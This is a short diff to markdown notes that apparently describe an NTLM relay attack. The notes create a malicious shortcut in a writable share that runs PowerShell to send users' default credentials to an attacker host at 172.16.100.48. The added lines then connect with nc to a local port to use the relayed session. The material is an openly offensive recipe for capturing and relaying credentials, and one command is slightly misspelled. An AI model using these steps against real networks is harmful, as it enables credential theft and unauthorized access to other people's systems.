@@ -75,3 +75,9 @@ Create new shortcut with this command and place in writable share
 ```bash
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke WebRequest -Uri 'http://172.16.100.48' -UseDefaultCredentials"
 ```
+
+After relay connect to shell
+```bash
+nc 127.0.0.1 11000
+```
+
